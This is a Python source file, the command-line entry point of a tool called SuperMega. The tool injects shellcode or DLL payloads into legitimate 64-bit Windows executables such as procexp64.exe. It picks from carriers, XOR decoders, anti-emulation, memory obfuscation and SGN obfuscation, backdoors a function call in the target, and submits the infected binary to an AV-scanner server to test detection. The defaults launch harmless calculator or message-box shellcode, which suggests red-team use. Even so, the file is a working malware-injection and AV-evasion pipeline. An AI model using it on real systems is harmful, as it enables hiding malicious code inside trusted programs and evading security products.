import argparse
from typing import Dict
import os
import logging
import time

from helper import *
from config import config
import phases.templater
import phases.compiler
import phases.assembler
import phases.injector
from observer import observer
from pe.pehelper import preload_dll
from sender import scannerDetectsBytes
from model.project import Project, prepare_project
from model.settings import Settings
from model.defs import *
from log import setup_logging
from model.injectable import DataReuseEntry
from utils import check_deps


def main():
    """Argument parsing for when called from command line"""
    logger.info("Super Mega")
    config.load()
    check_deps()
    settings = Settings("commandline")

    if not os.path.exists(settings.project_path):
        logger.info("Creating project directory: {}".format(settings.project_path))
        os.makedirs(settings.project_path)

    parser = argparse.ArgumentParser(description='SuperMega shellcode loader')
    parser.add_argument('--shellcode', type=str, help='payload shellcode: data/binary/shellcodes/* (messagebox.bin, calc64.bin, ...)', default="calc64.bin")
    parser.add_argument('--inject', type=str, help='which exe to inject into: data/binary/injectables/* (7z.exe, procexp64.exe, ...)', default="procexp64.exe")
    parser.add_argument('--carrier', type=str, help='carrier: data/source/carrier/* (alloc_rw_rx, peb_walk, ...)', default="alloc_rw_rx")
    parser.add_argument('--decoder', type=str, help='decoder: data/source/decoders/* (xor_1, xor_2, plain, ...)', default="xor_2")
    parser.add_argument('--antiemulation', type=str, help='anti-emulation: data/source/antiemulation/* (sirallocalot, timeraw, none, ...)', default="sirallocalot")
    parser.add_argument('--memoryobfuscation', type=str, help='memory obfuscation: data/source/memoryobfuscation/* (spawn a new process that encrypts / decrypts memory)', default="spawn")
    parser.add_argument('--process-spawn', type=str, help='when using memory obfuscation with a helper/controller process to handle it, provide full path of process to spawn)', default="C:\\Windows\System32\\notepad.exe")
    parser.add_argument('--guardrail', type=str, help='guardrails: Enable execution guardrails', default="none")
    parser.add_argument('--guardrail-key', type=str, help='guardrails: key', default="")
    parser.add_argument('--guardrail-value', type=str, help='guardrails: value', default="")
    parser.add_argument('--carrier_invoke', type=str, help='how carrier is started: \"backdoor\" to rewrite call instruction, \"overwrite\" to overwrite function', choices=["overwrite", "backdoor"], default="backdoor")
    parser.add_argument('--dllfunc', type=str, help='The DLL function use for carrier_invoke', default="")

    parser.add_argument('--payload_location', type=str, help='where to put the payload: "code" or "data"', choices=[".code", ".rdata"], default=".rdata" )
    parser.add_argument('--no-fix-iat', action='store_true', help='Fix missing IAT entries in the infectable executable', default=False)
    parser.add_argument('--start', action='store_true', help='Start the infected executable at the end for testing')
    parser.add_argument('--short-call-patching', action='store_true', help='Debug: Make short calls long. You will know when you need it.')
    parser.add_argument('--no-clean-at-start', action='store_true', help='Debug: Dont remove any temporary files at start')
    parser.add_argument('--no-clean-at-exit', action='store_true', help='Debug: Dont remove any temporary files at exit')
    parser.add_argument('--show', action='store_true', help='Debug: Show tool output')
    parser.add_argument('--debug', action='store_true', help='Debug: Show debug output')
    args = parser.parse_args()

    if args.show:
        config.ShowCommandOutput = True
    if args.debug:
        setup_logging(logging.DEBUG)
    else:
        setup_logging(logging.INFO)

    # IN: Shellcode: filename
    # IN: Inject: filename
    settings.injectable_base = args.inject
    settings.payload_base = args.shellcode

    # Cleanup
    settings.try_start_final_infected_exe = args.start
    settings.cleanup_files_on_start = not args.no_clean_at_start
    settings.cleanup_files_on_exit =not args.no_clean_at_exit

    # Misc
    settings.fix_missing_iat = not args.no_fix_iat
    if args.short_call_patching:
        settings.short_call_patching = True

    # Main 1
    settings.decoder_style = args.decoder
    settings.carrier_name = args.carrier
    settings.plugin_antiemulation = args.antiemulation
    settings.plugin_memoryobfuscation = args.memoryobfuscation
    settings.process_spawn = args.process_spawn

    # Main 2
    if args.payload_location == ".code":
        settings.payload_location = PayloadLocation.CODE
    elif args.payload_location == ".rdata":
        settings.payload_location = PayloadLocation.DATA
    if args.carrier_invoke == "overwrite":
        settings.carrier_invoke_style = CarrierInvokeStyle.OverwriteFunc
    elif args.carrier_invoke == "backdoor":
        settings.carrier_invoke_style = CarrierInvokeStyle.BackdoorFunc

    # Plugins
    if args.guardrail:
        settings.plugin_guardrail = args.guardrail
        settings.plugin_guardrail_data_key = args.guardrail_key
        settings.plugin_guardrail_data_value = args.guardrail_value

    # Start it
    exit_code = start(settings)
    exit(exit_code)


def start(settings: Settings) -> int:
    """Main entry point for the application. Will handle log files and cleanup"""

    # Delete: all old files
    clean_tmp_files()
    if settings.cleanup_files_on_start:
        clean_files(settings)
        
    # And logs
    observer.reset()

    # Set new keys
    config.make_encryption_keys()

    # Prepare the project: copy all files to projects/<project_name>/
    prepare_project(settings.project_name)

    # Do the thing and catch the errors
    ret = False
    if config.catch_exception:
        ret = start_real(settings)
    else:
        try:
            ret = start_real(settings)
        except Exception as e:
            logger.error(f'Error compiling: {e}')
            observer.write_logs(settings.project_path)
            return 1
    
    # Cleanup files
    clean_tmp_files()
    if settings.cleanup_files_on_exit:
        clean_files(settings)

    # Write logs (on success)
    observer.write_logs(settings.project_path)
    return ret


def sanity_checks(settings):
    if 'dll_loader' in settings.carrier_name:
        if not settings.get_payload_path().endswith(".dll"):
            raise Exception("dll loader requires a dll as payload, not shellcode")
    else:
        if not settings.get_payload_path().endswith(".bin"):
            raise Exception("loader requires shellcode as payload, not DLL")



def start_real(settings: Settings) -> bool:
    """Main entry point for the application. This is where the magic happens (based on settings)"""

    #settings.print()

    # Load our input
    project = Project(settings)
    if not project.init():
        logger.error("Error initializing project")
        return False

    # CHECK if 64 bit
    if not project.injectable.superpe.is_64():
        raise Exception("Binary is not 64bit: {}".format(project.settings.get_inject_exe_in()))

    # Tell user if they attempt to do something stupid
    sanity_checks(project.settings)

    # FIXUP DLL Payload
    # Prepare DLL payload for usage in dll_loader_change
    # This needs to be done before rendering the C templates, as need
    # the real size of the payload
    if project.settings.carrier_name == "dll_loader_change":
        project.payload.payload_data = preload_dll(project.payload.payload_path)

    # CREATE: Carrier C source files from template (C->C)
    try:
        phases.templater.create_c_from_template(settings, len(project.payload.payload_data))
    except FileNotFoundError as e:
        logger.error("Error creating C from template: {}".format(e))
        return False

    # PREPARE DataReuseEntry for usage in Compiler/AsmTextParser
    # So the carrier is able to find the payload
    if project.settings.payload_location == PayloadLocation.CODE:
        project.injectable.add_datareuse_fixup(DataReuseEntry("supermega_payload", in_code=True))
    else:
        project.injectable.add_datareuse_fixup(DataReuseEntry("supermega_payload", in_code=False))
    entry = project.injectable.get_reusedata_fixup("supermega_payload")
    entry.data = phases.assembler.encode_payload(
        project.payload.payload_data, settings.decoder_style)  # encrypt
    observer.add_code_file("payload", project.payload.payload_data)

    # COMPILE: Carrier to .asm (C -> ASM)
    if settings.generate_asm_from_c:
        try:
            phases.compiler.compile(
                c_in = settings.project_c_path, 
                asm_out = settings.project_asm_path,
                injectable = project.injectable,
                settings = project.settings)
        except ChildProcessError as e:
            logger.error("Error compiling C to ASM: {}".format(e))
            return False
        
    # we have the carrier-required IAT entries in carrier.iat_requests
    # CHECK if all are available in infectable, or abort (early check)
    functions = project.injectable.get_unresolved_iat()
    if len(functions) != 0 and settings.fix_missing_iat == False:
        logger.error("IAT entries not found in infectable: {}".format(", ".join(functions)))
        logger.error("The carrier depends on these functions, but they are not available in the infectable exe.")
        logger.error("Use another infectable exe, or update the carrier to not depend on these functions.")
        logger.error(" or dont use --no-fix-iat")
        return False

    # ASSEMBLE: Assemble .asm to .shc (ASM -> SHC)
    carrier_shellcode: bytes = phases.assembler.asm_to_shellcode(
        asm_in = settings.project_asm_path, 
        build_exe = settings.project_exe_path)
    observer.add_code_file("carrier_shc", carrier_shellcode)

    # INJECT loader into an exe and do IAT & data references. Big task.
    injector = phases.injector.Injector(
        carrier_shellcode,
        project.payload,
        project.injectable,
        settings)

    try:         
        injector.inject_exe()
    except Exception as e:
        logger.error("Error injecting executable: {}".format(e))
        return False
    #observer.add_code_file("exe_final", extract_code_from_exe_file_ep(settings.get_inject_exe_out(), 300))

    # Check binary with avred
    if config.get("avred_server") != "":
        if settings.verify or settings.try_start_final_infected_exe:
            filename = os.path.basename(settings.get_inject_exe_in())
            with open(settings.get_inject_exe_out(), "rb") as f:
                data = f.read()
            scannerDetectsBytes(data, filename, useBrotli=True, verify=settings.verify)
    else:
        # Support automated verification (dev)
        if settings.verify:
            logger.info("    Verify infected exe")
            payload_exit_code = phases.injector.verify_injected_exe(
                settings.get_inject_exe_out(),
                dllfunc=settings.dllfunc)
            if payload_exit_code != 0:
                logger.warning("Payload exit code: {}".format(payload_exit_code))
                return False
            
        elif settings.try_start_final_infected_exe:
            run_exe(settings.get_inject_exe_out(), dllfunc=settings.dllfunc, check=False)

    if settings.plugin_guardrail != "none":
        logger.warning("! Remember your guardrails settings when testing")
        logger.warning("!   {}: {} / {}".format(
            settings.plugin_guardrail,
            settings.plugin_guardrail_data_key, 
            settings.plugin_guardrail_data_value))

    return True


def obfuscate_shc_loader(file_shc_in, file_shc_out):
    logger.info("    Obfuscate shellcode with SGN")
    run_process_checkret([
        config.get("path_sgn"),
        "--arch=64",
        "-i", "{}".format(file_shc_in),
        "-o", "{}".format(file_shc_out),
    ], check=True)
    if not os.path.isfile(file_shc_out):
        logger.info("Error")
        return
    else:
        logger.info("   > Success obfuscation")
        pass


def verify_shellcode(shc_name):
    logger.info("      Verify shellcode: {}".format(shc_name))

    # check if directory exists
    if not os.path.exists(os.path.dirname(VerifyFilename)):
        logger.info("Error, directory does not exist for: {}".format(VerifyFilename))
        return
    
    # remove indicator file
    pathlib.Path(VerifyFilename).unlink(missing_ok=True)

    run_process_checkret([
        config.get("path_runshc"),
        "{}".format(shc_name),
    ], check=False)
    time.sleep(SHC_VERIFY_SLEEP)
    if os.path.isfile(VerifyFilename):
        logger.info("---> Verify OK. Shellcode works (file was created)")
        os.remove(VerifyFilename)
        return True
    else:
        logger.error("---> Verify FAIL. Shellcode doesnt work (file was not created)")
        return False
    

if __name__ == "__main__":
    main()
